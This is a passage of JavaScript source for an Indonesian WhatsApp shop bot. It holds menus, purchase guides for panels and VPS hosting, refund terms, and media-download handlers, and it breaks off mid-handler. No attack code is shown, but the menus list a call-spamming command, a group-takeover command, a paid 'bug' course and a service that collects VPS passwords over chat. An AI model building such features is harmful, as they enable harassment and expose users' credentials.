            externalAdReply: {
                title: `List All Fitur Vps & SSH Menu`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "grubmenu": case "gbmenu": {
    let teks = `*— ɢʀᴜᴘ ᴍᴇɴᴜ*
⳺ .add
⳺ .kick
⳺ .close
⳺ .open
⳺ .hidetag
⳺ .kudetagc
⳺ .leave
⳺ .tagall
⳺ .promote
⳺ .demote
⳺ .resetlinkgc
⳺ .welcome
⳺ .antilink
⳺ .antilink2
⳺ .mute
⳺ .blacklistjpm
⳺ .linkgc
⳺ .cekidgc`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List All Fitur Group Menu`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "ownmenu": case "ownermenu": {
    let teks = `*— ᴏᴡɴᴇʀ ᴍᴇɴᴜ*
⳺ .addowner
⳺ .listowner
⳺ .delowner
⳺ .self/public
⳺ .setppbot
⳺ .clearsession
⳺ .clearchat
⳺ .resetdb
⳺ .backupsc
⳺ .getcase
⳺ .listgc
⳺ .joingc
⳺ .joinch
⳺ .addidch
⳺ .delidch
⳺ .listidch
⳺ .addsc
⳺ .delsc
⳺ .listsc
⳺ .addstokdo
⳺ .delstokdo
⳺ .liststokdo
⳺ .addsaldo
⳺ .minsaldo
⳺ .ceksaldo
⳺ .spamcall`;
    await Rulzz.sendMessage(m.chat, { 
        text: teks, 
        mentions: [m.sender], 
        contextInfo: {
            externalAdReply: {
                title: `List All Fitur Owner Menu`, 
                body: `© Powered By ${namaOwner}`, 
                thumbnailUrl: global.image.reply, 
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null });
}
break

case "buymenu":
case "layanan": {

  const layanan = [
    {
      title: "RulzXD V4.0 By Rulzz OfficiaL",
      rows: [
        { title: "Syarat & Ketentuan Klaim Garansi", id: ".sk" },
        { title: "Panduan Pembelian", id: ".panduan" },
        { title: "Deposit Saldo", id: ".deposit" },
        { title: "Rekap Transaksi 7 Hari", id: ".rekaptransaksi" }
      ]
    },
    {
      title: "Panel Pterodactyl",
      rows: [
        { title: "Panel Private", id: ".buypanel" },
        { title: "Reseller Panel Public", id: ".buyresellerpublic" },
        { title: "Reseller Panel Private", id: ".buyresellerprivate" },
        { title: "Admin Panel", id: ".buyadminpanel" },
        { title: "Partner Panel", id: ".buypartnerpanel" },
        { title: "Owner Panel", id: ".buyownerpanel" },
        { title: "Egg Panel", id: `${prefix}buyegg` }
      ]
    },
    {
      title: "Kebutuhan Hosting",
      rows: [
        { title: "Virtual Private Server (VPS)", id: ".buyvps" },
        { title: "Account Digital Ocean", id: ".buydigitalocean" },
        { title: "Script Bot", id: ".buysc" },
        { title: "Reseller Subdomain", id: ".buyresellersubdo" },
        { title: "2 Subdomain", id: ".buysubdo" }
      ]
    },
    {
      title: "Murid Murid",
      rows: [
        { title: "Murid Bug", id: ".buymurbug" },
        { title: "Murid Nokos", id: ".buymurnok" }
      ]
    },
    {
      title: "Jasa Jasa",
      rows: [
        { title: "Jasa Install Panel", id: ".jasainstallpanel" },
        { title: "Jasa Install Tema Panel", id: ".jasainstalltema" },
        { title: "Jasa HB Panel", id: ".jasahbpanel" },
        { title: "Jasa Ganti Pw Vps", id: ".jasagantipwvps" }
      ]
    }
  ];

  return Rulzz.sendMessage(
    m.chat,
    {
      text: "_⚠️ Segala kelalaian buyer bukan tanggung jawab kami._\n> Kami siap reffund uang anda sesuai S&K yang berlaku.",
      headerType: 1,
      viewOnce: true,
      buttons: [
        {
          type: 4,
          buttonId: "action",
          buttonText: { displayText: "ini pesan interactiveMeta" },
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              title: "Layanan Tersedia 📦",
              sections: layanan // langsung saja
            })
          }
        }
      ],
      contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
      }
    },
    { quoted: m }
  );
}
break;

case "panduan": {
  const panduannya = [
    {
     title: "RulzXD V4.0 By Rulzz OfficiaL",
     highlight: true,
     rows: [
       {
        title: "Syarat & Ketentuan Klaim Garansi",
        id: ".sk"
       },
      {
       title: "Deposit Saldo",
       id: ".deposit"
      }
      ]
     },
    {
      title: "Panduan Pterodactyl",
      rows: [
        {
          title: "Panduan Pembelian Panel",
          id: ".panduanpanel"
        },
        {
          title: "Panduan Pembelian VPS",
          id: ".panduanvps"
        },
        {
          title: "Panduan Pembelian Akun DO",
          id: ".panduando"
        }
      ]
    },
    {
      title: "Panduan Kebutuhan Hosting",
      rows: [
        {
          title: "Panduan Pembelian Script Bot",
          id: ".panduansc"
        },
        {
          title: "Panduan Pembelian Subdomain",
          id: ".panduansubdo"
        }
      ]
    },
    {
      title: "Panduan Jasa Jasa",
      rows: [
        {
          title: "Panduan Jasa Install Panel",
          id: ".panduaninstallpanel"
        },
        {
          title: "Panduan Jasa Install Tema Panel",
          id: ".panduaninstalltema"
        },
        {
          title: "Panduan Jasa HB Panel",
          id: ".panduanhbpanel"
        },
        {
          title: "Panduan Jasa Ganti Pw Vps",
          id: ".panduangantipwvps"
        }
      ]
    }
  ];

  const sections = panduannya.map(({ title, highlight, rows }) => ({
    title,
    rows,
    ...(highlight && { highlight_label: "Recommend" })
  }));

  return Rulzz.sendMessage(
    m.chat,
    {
      text: "*Berikut ini adalah panduan layanan pembelian produk di RulzXD Botz V4.0_*\n_Silakan klik button di bawah untuk melihat panduan._",
      headerType: 1,
      viewOnce: true,
      buttons: [
        {
          type: 4,
          buttonId: "action",
          buttonText: { displayText: "ini pesan interactiveMeta" },
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              title: "Pilih Panduan Layanan 📦",
              sections
            })
          }
        }
      ],
      contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
      }
    },
    { quoted: m }
  );
}
break

case "sk": {
 let teks = `*🌐 S&K KLAIM GARANSI / REFFUND*
*📦 RulzXD Botz V4 — Sistem Pembelian Otomatis*

Kami menjamin transaksi yang adil & aman. Jika kamu mengalami kendala saat order, kamu bisa ajukan garansi atau reffund sesuai ketentuan berikut:

━━━━━━━━━━━━━━━
🔹 APA YANG DICAKUP GARANSI?
✅ Produk tidak terkirim padahal bot bilang “berhasil”
✅ Pembayaran sukses, tapi bot tidak merespon
✅ Error sistem saat proses pengiriman (bukan salah user)

━━━━━━━━━━━━━━━
🔸 GARANSI TIDAK BERLAKU UNTUK:
❌ Salah input data (ID/nomor/nominal)
❌ Pembayaran pending / belum masuk
❌ Transaksi bukan lewat bot RulzXD Botz V4
❌ Klaim melebihi 1x24 jam
❌ Bukti tidak valid / mencurigakan

━━━━━━━━━━━━━━━
📌 CARA KLAIM GARANSI / REFFUND:

1. Buka bot RulzXD Botz V4
2. Ketik: .reffund
3. Isi semua data yang diminta:
📎 Nomor transaksi
📎 Alasan klaim
📎 Bukti transfer / screenshot
4. Tunggu proses verifikasi max 1x24 jam kerja


🛠 Jika disetujui:
🔁 Produk dikirim ulang, atau
💸 Uang dikembalikan ke saldo/nomor kamu

━━━━━━━━━━━━━━━
📢 CATATAN:
– Hanya berlaku untuk transaksi di bot ini
– Jangan hapus bukti transaksi sebelum klaim selesai
– Klaim palsu = blacklist permanen
– Dengan bertransaksi, kamu dianggap menyetujui S&K ini

━━━━━━━━━━━━━━━
📞 Bantuan Admin:
👤 Rulzz OfficiaL
📱 wa.me/6285133225752
🕐 Jam Layanan: 09.00 – 22.00 WIB

━━━━━━━━━━━━━━━
🙏 Terima kasih sudah menggunakan RulzXD Botz V4`
await Rulzz.sendMessage(m.chat, {
  text: teks.trim(),
  footer: `RulzXD Botz V4 New`,
  buttons: [
    {
      buttonId: `.buymenu`,
      buttonText: { displayText: 'Buy Menu' },
      type: 1
    },
    {
      buttonId: `.reffund`,
      buttonText: { displayText: 'Reffund' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true
})
}
break
case "panduanpanel": {
 let teks = `*📘 PANDUAN PEMBELIAN PANEL*
*📦 RulzXD Botz V4 — Sistem Pembelian Otomatis*

1. Ketik perintah *.buypanel username*
2. Pilih spesifikasi panel (ram disk & cpu)
3. Pembelian berhasil

━━━━━━━━━━━━━━━
*🔹 PEMBAYARAN VIA APA?*
💰 Pembayaran menggunakan saldo akun kamu.
- Kalo saldo cukup, saldo otomatis di potong dan panel langsung di buat✅
- Kalo saldo tidak cukup, kamu bakal di kasih tau nominal kurangnya.

━━━━━━━━━━━━━━━
*🔸 BAGAIMANA CARA ISI SALDO?*
💰 Menggunakan command *.deposit nominal*

━━━━━━━━━━━━━━━
📌 Kalo panel gagal di buat, saldo kamu otomatis di kembalikan. Jika saldo tidak di kembalikan, kamu bisa menggunakan command *.reffund* untuk mengajukan klaim garansi.

🙏 Terima kasih sudah menggunakan RulzXD Botz V4`
await Rulzz.sendMessage(m.chat, {
  text: teks.trim(),
  footer: `RulzXD Botz V4 By Rulzz OfficiaL`,
  buttons: [
    {
      buttonId: `.buypanel`,
      buttonText: { displayText: 'Beli Panel' },
      type: 1
    },
    {
      buttonId: `.deposit`,
      buttonText: { displayText: 'Deposit' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true
})
}
break
case "panduanvps": {
 let teks = `*📘 PANDUAN PEMBELIAN VPS*
*📦 RulzXD Botz V4 — Sistem Pembelian Otomatis*

1. Ketik perintah *.buyvps subdomain*
2. Pilih spesifikasi vps
3. Pembelian berhasil

━━━━━━━━━━━━━━━
*🔹 PEMBAYARAN VIA APA?*
💰 Pembayaran menggunakan qris.
- Bot kirim foto qris.
- User transfer ke qris yang di kirim bot.
- User masukkan pin.
- Bot melakukan pembuatan vps.
- Pembelian berhasil

━━━━━━━━━━━━━━━
📌 Kalo vps gagal di buat, kamu bisa menggunakan command *.reffund* untuk mengajukan klaim garansi.

🙏 Terima kasih sudah menggunakan RulzXD Botz V4`
await Rulzz.sendMessage(m.chat, {
  text: teks.trim(),
  footer: `RulzXD Botz V4 By Rulzz OfficiaL`,
  buttons: [
    {
      buttonId: `.buyvps`,
      buttonText: { displayText: 'Beli VPS' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true
})
}
break
case "panduando": {
 let teks = `*📘 PANDUAN PEMBELIAN AKUN DO*
*📦 RulzXD Botz V4 — Sistem Pembelian Otomatis*

1. Ketik perintah *.buydo*
2. Pilih spesifikasi akun yang ingin kamu beli.
3. Lakukan pembayaran ke qris.
4. Pembelian berhasil

━━━━━━━━━━━━━━━
*🔹 PEMBAYARAN VIA APA?*
💰 Pembayaran menggunakan qris.
- Bot kirim foto qris.
- User transfer ke qris yang di kirim bot.
- User masukkan pin.
- Bot melakukan pembuatan vps.
- Pembelian berhasil

━━━━━━━━━━━━━━━
📌 Kalo data akun tidak terkirim, atau spesifikasi akun tidak sesuai dengan yang di beli, kamu bisa menggunakan command *.reffund* untuk mengajukan klaim garansi.

🙏 Terima kasih sudah menggunakan RulzXD Botz V4`
await Rulzz.sendMessage(m.chat, {
  text: teks.trim(),
  footer: `RulzXD Botz V4 By Rulzz OfficiaL`,
  buttons: [
    {
      buttonId: `.buydo`,
      buttonText: { displayText: 'Beli Akun DO' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true
})
}
break
case "panduansc": {
 let teks = `*📘 PANDUAN PEMBELIAN SCRIPT*
*📦 RulzXD Botz V4 — Sistem Pembelian Otomatis*

1. Ketik perintah *.buysc*
2. Pilih script yang ingin kamu beli.
3. Pembelian berhasil.

━━━━━━━━━━━━━━━
*🔹 PEMBAYARAN VIA APA?*
💰 Pembayaran menggunakan saldo akun kamu.
- Kalo saldo cukup, saldo otomatis di potong dan panel langsung di buat✅
- Kalo saldo tidak cukup, kamu bakal di kasih tau nominal kurangnya.

━━━━━━━━━━━━━━━
*🔸 BAGAIMANA CARA ISI SALDO?*
💰 Menggunakan command *.deposit nominal*

━━━━━━━━━━━━━━━
📌 Kalo script tidak terkirim saat pembelian berhasil, kamu bisa menggunakan command *.reffund* untuk mengajukan klaim garansi.

🙏 Terima kasih sudah menggunakan RulzXD Botz V4`
await Rulzz.sendMessage(m.chat, {
  text: teks.trim(),
  footer: `RulzXD Botz V4 By Rulzz OfficiaL`,
  buttons: [
    {
      buttonId: `.buysc`,
      buttonText: { displayText: 'Beli Script' },
      type: 1
    },
    {
      buttonId: `.deposit`,
      buttonText: { displayText: 'Deposit' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true
})
}
break
case "panduansubdo": {
 let teks = `*📘 PANDUAN PEMBELIAN SUBDOMAIN*
*📦 RulzXD Botz V4 — Sistem Pembelian Otomatis*

1. Ketik perintah *.buysubdo ipvps|reqsubdo*
2. Pembelian berhasil

📘 Pembelian mendapatkan 2 subdomain.

━━━━━━━━━━━━━━━
*🔹 PEMBAYARAN VIA APA?*
💰 Pembayaran menggunakan saldo akun kamu.
- Kalo saldo cukup, saldo otomatis di potong dan panel langsung di buat✅
- Kalo saldo tidak cukup, kamu bakal di kasih tau nominal kurangnya.

━━━━━━━━━━━━━━━
*🔸 BAGAIMANA CARA ISI SALDO?*
💰 Menggunakan command *.deposit nominal*

━━━━━━━━━━━━━━━
📌 Kalo subdomain gagal di buat, kamu bisa menggunakan command *.reffund* untuk mengajukan klaim garansi.

🙏 Terima kasih sudah menggunakan RulzXD Botz V4`
await Rulzz.sendMessage(m.chat, {
  text: teks.trim(),
  footer: `RulzXD Botz V4 By Rulzz OfficiaL`,
  buttons: [
    {
      buttonId: `.buysubdo`,
      buttonText: { displayText: 'Beli Subdomain' },
      type: 1
    },
    {
      buttonId: `.deposit`,
      buttonText: { displayText: 'Deposit' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true
})
}
break
case "panduaninstallpanel": {
 let teks = `*📘 PANDUAN PEMBELIAN JASA INSTALL PANEL*
*📦 RulzXD Botz V4 — Sistem Pembelian Otomatis*

1. Ketik perintah *.jasainstallpanel <req_subdo>*
2. Pilih spesifikasi panel (ram disk & cpu)
3. Pembelian berhasil

━━━━━━━━━━━━━━━
*🔹 PEMBAYARAN VIA APA?*
💰 Pembayaran menggunakan qris.
- Bot kirim foto qris.
- User transfer ke qris yang di kirim bot.
- User masukkan pin.
- Bot melakukan pembuatan vps.
- Pembelian berhasil

━━━━━━━━━━━━━━━
📌 Kalo panel tidak di kirim sampai 12 menit setelah pembayaran, kamu bisa menggunakan command *.reffund* untuk mengajukan klaim garansi.

🙏 Terima kasih sudah menggunakan RulzXD Botz V4`
await Rulzz.sendMessage(m.chat, {
  text: teks.trim(),
  footer: `RulzXD Botz V4 By Rulzz OfficiaL`,
  buttons: [
    {
      buttonId: `.jasainstallpanel`,
      buttonText: { displayText: 'Beli Jasa Install Panel' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true
})
}
break
case "panduaninstalltema": {
 let teks = `*📘 PANDUAN PEMBELIAN PANEL*
*📦 RulzXD Botz V4 — Sistem Pembelian Otomatis*

1. Ketik perintah *.jasainstalltema*
2. Pilih tema panel yang ingin kamu beli.
3. Lakukan pembayaran.
4. Tunggu bot menginstall tema.
5. Pembelian berhasil.

━━━━━━━━━━━━━━━
*🔹 PEMBAYARAN VIA APA?*
💰 Pembayaran menggunakan qris.
- Bot kirim foto qris.
- User transfer ke qris yang di kirim bot.
- User masukkan pin.
- Bot melakukan pembuatan vps.
- Pembelian berhasil

━━━━━━━━━━━━━━━
📌 Kalo panel tidak di install sampai 12 menit setelah pembayaran, kamu bisa menggunakan command *.reffund* untuk mengajukan klaim garansi.

🙏 Terima kasih sudah menggunakan RulzXD Botz V4`
await Rulzz.sendMessage(m.chat, {
  text: teks.trim(),
  footer: `RulzXD Botz V4 By Rulzz OfficiaL`,
  buttons: [
    {
      buttonId: `.jasainstalltema`,
      buttonText: { displayText: 'Beli Jasa Install Tema Panel' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true
})
}
break
case "panduanhbpanel": {
 let teks = `*📘 PANDUAN PEMBELIAN JASA HB PANEL*
*📦 RulzXD Botz V4 — Sistem Pembelian Otomatis*

1. Ketik perintah *.jasahbpanel ipvps|pwvps*
2. Lakukan pembayaran ke qris yang di kirim bot.
3. Pembelian berhasil

━━━━━━━━━━━━━━━
*🔹 PEMBAYARAN VIA APA?*
💰 Pembayaran menggunakan qris.
- Bot kirim foto qris.
- User transfer ke qris yang di kirim bot.
- User masukkan pin.
- Bot melakukan pembuatan vps.
- Pembelian berhasil

━━━━━━━━━━━━━━━
📌 Kalo bot tidak mengirim akun admin panel yang baru, kamu bisa menggunakan command *.reffund* untuk mengajukan klaim garansi.

🙏 Terima kasih sudah menggunakan RulzXD Botz V4`
await Rulzz.sendMessage(m.chat, {
  text: teks.trim(),
  footer: `RulzXD Botz V4 By Rulzz OfficiaL`,
  buttons: [
    {
      buttonId: `.jasahbpanel`,
      buttonText: { displayText: 'Beli Jasa HB Panel' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true
})
}
break
case "panduangantipwvps": {
 let teks = `*📘 PANDUAN PEMBELIAN JASA GANTI PW VPS*
*📦 RulzXD Botz V4 — Sistem Pembelian Otomatis*

1. Ketik perintah *.jasagantipwvps ipvps|pwvpslama|pwvpsbaru*
2. Lakukan pembayaran.
3. Pembelian berhasil.

━━━━━━━━━━━━━━━
*🔹 PEMBAYARAN VIA APA?*
💰 Pembayaran menggunakan qris.
- Bot kirim foto qris.
- User transfer ke qris yang di kirim bot.
- User masukkan pin.
- Bot melakukan pembuatan vps.
- Pembelian berhasil

━━━━━━━━━━━━━━━
📌 Kalo ganti password vps gagal atau bot tidak merespon sampai 10 menit, kamu bisa menggunakan command *.reffund* untuk mengajukan klaim garansi.

🙏 Terima kasih sudah menggunakan RulzXD Botz V4`
await Rulzz.sendMessage(m.chat, {
  text: teks.trim(),
  footer: `RulzXD Botz V4 By Rulzz OfficiaL`,
  buttons: [
    {
      buttonId: `.jasagantipwvps`,
      buttonText: { displayText: 'Beli Jasa Ganti PW Vps' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true
})
}
break

//================================================================================

case "gimage": {
  if (!text) return m.reply(example("logo whatsapp"))
  await Rulzz.sendMessage(m.chat, { react: { text: '🔎', key: m.key } })

  try {
    const res = await fetchJson(`https://api.rulzzofficial.my.id/api/search/gimage?q=${encodeURIComponent(text)}`)
    if (!res.status || !res.result || res.result.length === 0) return m.reply("Gagal mendapatkan hasil pencarian gambar!")

    let total = 0
    let aray = res.result.length < 5 ? res.result : res.result.slice(0, 5)

    for (let i of aray) {
      await Rulzz.sendMessage(m.chat, {
        image: { url: i.url },
        caption: `Hasil pencarian foto ke ${++total}`
      }, { quoted: qtext })
    }
    await Rulzz.sendMessage(m.chat, { react: { text: '', key: m.key } })
  } catch (e) {
    console.error("Error di gimage:", e)
    m.reply("Terjadi kesalahan saat mencari gambar.\nCoba lagi nanti atau pastikan format perintahnya benar.")
  }
  await Rulzz.sendMessage(m.chat, { react: { text: '', key: m.key } })
}
break

case "reactch": {
  if (!text) return m.reply(example("https://whatsapp.com/channel/abc123/456 aku sayang kamu"));

  const regex = /https:\/\/whatsapp\.com\/channel\/(\w+)(?:\/(\d+))?/;
  const match = text.match(regex);
  if (!match) return m.reply("URL tidak valid. Format seharusnya:\nhttps://whatsapp.com/channel/ID/IDPesan");

  const channelId = match[1];
  const chatId = match[2];
  if (!chatId) return m.reply("ID pesan tidak ditemukan dalam URL.");

  const afterUrlText = text.replace(regex, '').trim();

  const emojiFont = (text) => {
    const map = {
      a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖', h: '🅗',
      i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝', o: '🅞', p: '🅟',
      q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤', v: '🅥', w: '🅦', x: '🅧',
      y: '🅨', z: '🅩',
      A: '🅐', B: '🅑', C: '🅒', D: '🅓', E: '🅔', F: '🅕', G: '🅖', H: '🅗',
      I: '🅘', J: '🅙', K: '🅚', L: '🅛', M: '🅜', N: '🅝', O: '🅞', P: '🅟',
      Q: '🅠', R: '🅡', S: '🅢', T: '🅣', U: '🅤', V: '🅥', W: '🅦', X: '🅧',
      Y: '🅨', Z: '🅩',
      ' ': ' '
    };
    return [...text].map(c => map[c] || c).join('');
  };

  const emojiFontFormatted = (text) => {
    const separator = '🅭'; // pemisah antar kata
    return text.split(' ').map(word => emojiFont(word)).join(separator);
  };

  const emojiText = emojiFontFormatted(afterUrlText || 'HI');

  try {
    const data = await Rulzz.newsletterMetadata("invite", channelId);
    if (!data) return m.reply("Gagal mengambil metadata channel.");

    await Rulzz.newsletterReactMessage(data.id, chatId, emojiText);
    m.reply(`✅ Sukses kirim reaksi:\n${emojiText}`);
  } catch (err) {
    console.error(err);
    m.reply("❌ Terjadi kesalahan saat mengirim reaksi.");
  }
}
break

//================================================================================

case "play": {
    if (!text) return m.reply(example("dj tiktok"))

    await Rulzz.sendMessage(m.chat, {
        react: { text: '🔎', key: m.key }
    })

    try {
        let ytsSearch = await yts(text)
        let res = ytsSearch.all[0]
        if (!res) return m.reply("❌ Video tidak ditemukan!")

        let anu = await ytdl.ytmp3(res.url)
        if (!anu.status) return m.reply("❌ Gagal mengunduh audio!")

        let urlMp3 = anu.download.url

        await Rulzz.sendMessage(m.chat, {
            audio: { url: urlMp3 },
            mimetype: "audio/mpeg",
            contextInfo: {
                externalAdReply: {
                    thumbnailUrl: res.thumbnail,
                    title: res.title,
                    body: `Author: ${res.author.name} • Duration: ${res.timestamp}`,
                    sourceUrl: res.url,
                    renderLargerThumbnail: true,
                    mediaType: 1
                }
            }
        }, { quoted: m })

    } catch (e) {
        console.error(e)
        return m.reply("❌ Terjadi kesalahan saat memproses permintaan.")
    }

    await Rulzz.sendMessage(m.chat, {
        react: { text: '', key: m.key }
    })
}
break

//================================================================================

case "playvid": {
    if (!text) return m.reply(example("dj tiktok"))

    await Rulzz.sendMessage(m.chat, {
        react: { text: '🔎', key: m.key }
    })

    try {
        let ytsSearch = await yts(text)
        let res = ytsSearch.all[0]
        if (!res) return m.reply("❌ Video tidak ditemukan!")

        let anu = await ytdl.ytmp4(res.url)
        if (!anu.status) return m.reply("❌ Gagal mengunduh video!")

        let urlMp4 = anu.download.url

        await Rulzz.sendMessage(m.chat, {
            video: { url: urlMp4 },
            mimetype: "video/mp4",
            caption: `${res.title}\n\nAuthor: ${res.author.name}\nDuration: ${res.timestamp}`,
            contextInfo: {
                externalAdReply: {
                    title: res.title,
                    body: `Author: ${res.author.name} • Duration: ${res.timestamp}`,
                    thumbnailUrl: res.thumbnail,
                    sourceUrl: res.url,
                    renderLargerThumbnail: true,
                    mediaType: 1
                }
            }
        }, { quoted: m })

    } catch (e) {
        console.error(e)
        return m.reply("❌ Terjadi kesalahan saat memproses video.")
    }

    await Rulzz.sendMessage(m.chat, {
        react: { text: '', key: m.key }
    })
}
break

//===============================================================================

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await Rulzz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await Rulzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
                    
//===============================================================================

case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await Rulzz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await ytdl.ytmp3(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Rulzz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Rulzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

case "cekcuaca": case "cuaca": {
  if (!text) return m.reply(example("Jakarta"));
  await Rulzz.sendMessage(m.chat, { react: { text: '🔎', key: m.key }});
  await fetch(`https://api.diioffc.web.id/api/tools/cekcuaca?query=${text}`).then(async (res) => {
    const response = await res.json();
    const teks = `*◦ Lokasi :* ${response.result.name}
*◦ Negara :* ${response.result.sys.country}
*◦ Cuaca :* ${response.result.weather[0].description}
*◦ Suhu saat ini :* ${response.result.main.temp} °C
*◦ Suhu tertinggi :* ${response.result.main.temp_max} °C
*◦ Suhu terendah :* ${response.result.main.temp_min} °C
*◦ Kelembapan :* ${response.result.main.humidity} %
*◦ Angin :* ${response.result.wind.speed} km/jam`;
    await Rulzz.sendMessage(m.chat, { react: { text: '', key: m.key }});
    Rulzz.sendMessage(m.chat, { text: teks }, { quoted: m });
  }).catch(err => {
    console.log(util.format(err));
    m.reply(`API Tidak dapat memproses permintaan tersebut!`);
  });
}
break

//================================================================================

case "spdownload": case "spdl": case "spotifydownload": case "spd": {
if (!text) return m.reply(example("linknya"))
await Rulzz.sendMessage(m.chat, {react: {text: '⏱️', key: m.key}})
await fetch(`https://api.siputzx.my.id/api/d/spotify?url=${text}`).then(async (res) => {
const response = await res.json()
await Rulzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
Rulzz.sendMessage(m.chat, { audio: { url: response.data.download }, mimetype: "audio/mpeg", contextInfo: { externalAdReply: { thumbnailUrl: response.data.thumbnail, title: response.data.title, body: response.data.artist, sourceUrl: null, renderLargerThumbnail: true, mediaType: 1}}}, { quoted: m })
}).catch(err => m.reply('Error 🗿'))
}
break

//================================================================================

case "spotify": case "sps": case "spotifys": case "spotifysearch": {
  if (!text) return m.reply(example("penjaga hati"))
  
  await Rulzz.sendMessage(m.chat, { react: { text: '🔎', key: m.key }})
  
  try {
    const res = await fetch(`https://api.siputzx.my.id/api/s/spotify?query=${text}`)
    const response = await res.json()

    if (!response.status || !response.data || response.data.length === 0)
      return m.reply("Tidak ada hasil ditemukan")

    let teks = '*🔎 Hasil Pencarian Spotify*\n\n'
    for (let i of response.data) {
      teks += `*◦ Judul :* ${i.title}\n`
      teks += `*◦ Artis :* ${i.artist}\n`
      teks += `*◦ Album :* ${i.album}\n`
      teks += `*◦ Durasi :* ${i.duration}\n`
      teks += `*◦ Rilis :* ${i.release_date}\n`
      teks += `*◦ Link :* ${i.track_url}\n\n`
    }

    await Rulzz.sendMessage(m.chat, { react: { text: '', key: m.key } })
    m.reply(teks)
    
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat mengakses API')
    await Rulzz.sendMessage(m.chat, { react: { text: '', key: m.key } })
  }
}
break

//================================================================================

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await Rulzz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await ytdl.ytmp4(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Rulzz.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Rulzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "mediafire": {
  if (!text) return m.reply('⚠️ Kirimkan link MediaFire-nya.');
  await Rulzz.sendMessage(m.chat, {react: {text: '🕑', key: m.key}});

  try {
    const api = `https://api.siputzx.my.id/api/d/mediafire?url=${encodeURIComponent(text)}`;
    const res = await fetch(api);
    const json = await res.json();

    if (!json.status || !json.data || !json.data.downloadLink) {
      return m.reply('❌ Gagal mengambil link MediaFire.');
    }

    const { fileName, fileSize, downloadLink, uploadDate, fileType } = json.data;
    const sizeMB = parseFloat(fileSize.replace(/[^0-9.]/g, ''));

    if (sizeMB <= 100) {
      const waitMsg = await Rulzz.sendMessage(m.chat, { text: `📥 Mengunduh *${fileName}*...` }, { quoted: m });
      const fileBuffer = await axios.get(downloadLink, { responseType: 'arraybuffer' });
      await Rulzz.sendMessage(m.chat, {react: {text: '', key: m.key}})

      await Rulzz.sendMessage(m.chat, {
        document: Buffer.from(fileBuffer.data),
        fileName: fileName,
        mimetype: fileType || 'application/octet-stream',
        caption: `📦 *Nama:* ${fileName}\n📁 *Ukuran:* ${fileSize}\n📆 *Tanggal Upload:* ${uploadDate}\n🌐 *Sumber:* MediaFire`
      }, { quoted: m });

    } else {
      const msgProgress = await Rulzz.sendMessage(m.chat, { text: `📥 Mengunduh *${fileName}* (0%)` }, { quoted: m });

      const response = await axios.get(downloadLink, { responseType: 'stream' });
      const totalSize = parseInt(response.headers['content-length'], 10);
      let downloaded = 0;
      let lastPercent = 0;
      let startTime = Date.now();
      const chunks = [];

      response.data.on('data', async chunk => {
        chunks.push(chunk);
        downloaded += chunk.length;

        const percent = Math.floor((downloaded / totalSize) * 100);
        const elapsed = (Date.now() - startTime) / 1000;
        const speed = downloaded / elapsed;
        const remaining = (totalSize - downloaded) / speed;

        if (percent >= lastPercent + 5) {
          lastPercent = percent;
          const eta = remaining > 60
            ? `${Math.floor(remaining / 60)}m ${Math.floor(remaining % 60)}s`
            : `${Math.floor(remaining)}s`;

          await Rulzz.sendMessage(m.chat, {
            text: `📥 Mengunduh *${fileName}*\nProgress: ${percent}%\n⏳ Estimasi: ${eta}`,
            edit: msgProgress.key
          });
        }
      });
         
      await Rulzz.sendMessage(m.chat, {react: {text: '', key: m.key}});
